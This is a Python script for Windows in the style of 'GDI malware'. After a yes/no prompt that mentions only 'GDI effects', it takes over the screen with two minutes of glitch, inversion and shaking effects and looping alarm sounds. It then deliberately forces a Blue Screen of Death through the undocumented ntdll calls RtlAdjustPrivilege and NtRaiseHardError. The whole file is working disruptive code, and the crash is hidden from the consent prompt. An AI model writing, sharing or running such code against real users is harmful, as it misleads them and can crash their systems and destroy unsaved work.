import ctypes
import time
import random
import os
import sys
import winsound
import subprocess

# Windows API Constants
MB_YESNO = 0x04
IDYES = 6
SRCCOPY = 0x00CC0020
SRCINVERT = 0x00660046
PATINVERT = 0x005A0049
DSTINVERT = 0x00550009
BLACKNESS = 0x00000042

# System Icon IDs
IDI_ERROR = 32513
IDI_WARNING = 32515
IDI_QUESTION = 32514
IDI_WINLOGO = 32517

# Load DLLs
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
shcore = ctypes.windll.shcore
ntdll = ctypes.windll.ntdll 

try:
    shcore.SetProcessDpiAwareness(1)
except:
    user32.SetProcessDPIAware()

def trigger_instant_bsod():
    """Forces a Blue Screen of Death (100% chance)."""
    enabled = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
    response = ctypes.c_ulong()
    ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(response))

def run_gdi_payload():
    # 1. Message Box Prompt
    response = user32.MessageBoxW(0, "Do you want to execute and run the GDI effects?", "GDI Executor", MB_YESNO)
    if response != IDYES:
        sys.exit()

    # 2. Command Prompt Management
    subprocess.Popen("cmd /c timeout /t 2", shell=True)
    subprocess.Popen("cmd /c timeout /t 3", shell=True)

    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)
    hdc = user32.GetDC(0)
    
    icons = [user32.LoadIconW(0, IDI_ERROR), user32.LoadIconW(0, IDI_WARNING), 
             user32.LoadIconW(0, IDI_QUESTION), user32.LoadIconW(0, IDI_WINLOGO)]

    # 3. Initial Freeze and Shrink
    for i in range(0, 180, 1):
        gdi32.StretchBlt(hdc, i, i, sw - (i * 2), sh - (i * 2), hdc, 0, 0, sw, sh, SRCCOPY)
        time.sleep(0.06)

    user32.InvalidateRect(0, None, True)
    winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)

    left_y, right_y = -300, -300
    move_offset, move_dir = 0, 1
    start_time = time.time()
    total_duration = 120 # Increased duration for the extra themes

    print("Executing GDI Stages with Enhanced Colors... BSOD incoming.")
    
    try:
        while (time.time() - start_time) < total_duration:
            elapsed = (time.time() - start_time)
            
            # --- DESKTOP SHAKE ---
            move_offset = (move_offset + 12 * move_dir)
            if abs(move_offset) > 60: move_dir *= -1
            gdi32.BitBlt(hdc, move_offset, random.randint(-15, 15), sw, sh, hdc, 0, 0, SRCCOPY)

            # --- DUAL FALLING ICONS (Custom Sizes) ---
            icon_l, icon_r = random.choice(icons), random.choice(icons)
            user32.DrawIconEx(hdc, 50, int(left_y), icon_l, 300, 300, 0, 0, 3)
            user32.DrawIconEx(hdc, 360, int(left_y) + 50, icon_l, 120, 120, 0, 0, 3)
            user32.DrawIconEx(hdc, sw - 350, int(right_y), icon_r, 300, 300, 0, 0, 3)
            user32.DrawIconEx(hdc, sw - 480, int(right_y) + 50, icon_r, 120, 120, 0, 0, 3)
            left_y += 8; right_y += 8
            if left_y > sh: left_y = -300
            if right_y > sh: right_y = -300

            # --- DYNAMIC ENHANCED GDI STAGES ---
            
            # STAGE 1: Rainbow Paint Spray & Neon Circles
            if elapsed < 30:
                for _ in range(25):
                    rx, ry = random.randint(0, sw), random.randint(0, sh)
                    # Random Neon Colors
                    color = random.choice([0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF])
                    brush = gdi32.CreateSolidBrush(color)
                    gdi32.SelectObject(hdc, brush)
                    gdi32.Ellipse(hdc, rx, ry, rx + random.randint(10, 40), ry + random.randint(10, 40))
                    gdi32.DeleteObject(brush)

            # STAGE 2: Multi-Directional Tunnel Rotation (The Galaxy Reach)
            elif elapsed < 60:
                gdi32.StretchBlt(hdc, 15, 15, sw - 30, sh - 30, hdc, 0, 0, sw, sh, SRCCOPY)
                # Random Inversion Colors
                if random.random() > 0.5:
                    gdi32.BitBlt(hdc, random.randint(-20, 20), random.randint(-20, 20), sw, sh, hdc, 0, 0, SRCINVERT)
                else:
                    gdi32.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT)

            # STAGE 3: "Difficult Lines" & RGB Glitch (Infinite Reach)
            elif elapsed < 90:
                # Vertical RGB Strips
                x_pos = random.randint(0, sw)
                gdi32.BitBlt(hdc, x_pos, 10, 50, sh, hdc, x_pos, 0, SRCCOPY)
                # Colorful Lines
                pen = gdi32.CreatePen(0, random.randint(1, 4), random.randint(0, 0xFFFFFF))
                gdi32.SelectObject(hdc, pen)
                gdi32.MoveToEx(hdc, random.randint(0, sw), random.randint(0, sh), None)
                gdi32.LineTo(hdc, random.randint(0, sw), random.randint(0, sh))
                gdi32.DeleteObject(pen)

            # STAGE 4: Final Chaos - Zoom & Darkness Flashes
            else:
                gdi32.StretchBlt(hdc, -30, -30, sw + 60, sh + 60, hdc, 0, 0, sw, sh, SRCCOPY)
                if random.random() < 0.1:
                    gdi32.PatBlt(hdc, 0, 0, sw, sh, PATINVERT)
                # Random Custom Square Shapes
                brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
                gdi32.SelectObject(hdc, brush)
                gdi32.Rectangle(hdc, random.randint(0, sw), random.randint(0, sh), random.randint(0, sw), random.randint(0, sh))
                gdi32.DeleteObject(brush)

            # Random Windows Sounds
            if random.random() < 0.04:
                winsound.PlaySound(random.choice(["SystemExclamation", "SystemQuestion", "SystemHand"]), winsound.SND_ALIAS | winsound.SND_ASYNC)

            time.sleep(0.04)

    except KeyboardInterrupt:
        pass

    # 5. Final Triggerment
    winsound.PlaySound(None, winsound.SND_PURGE)
    user32.ReleaseDC(0, hdc)
    user32.InvalidateRect(0, None, True)
    
    trigger_instant_bsod()

if __name__ == "__main__":
    os.system("title GDI FINAL VERSION")
    os.system("mode con: cols=100 lines=30")
    run_gdi_payload()